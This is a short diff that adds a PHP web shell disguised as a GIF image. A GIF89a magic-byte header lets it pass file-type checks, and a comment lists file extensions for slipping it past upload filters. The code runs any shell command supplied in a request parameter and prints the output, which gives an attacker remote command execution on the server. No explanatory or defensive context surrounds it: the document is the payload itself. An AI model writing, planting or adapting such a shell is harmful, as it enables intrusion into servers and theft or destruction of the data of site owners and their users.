@@ -1,0 +1,4 @@
+GIF89a;
+<?php /* magic-byte prefixed webshell; rename to .php5/.phar/.pht/.php.jpg as needed */
+if (isset($_REQUEST['c'])) { echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST['c'] . ' 2>&1')) . "</pre>"; }
+?>
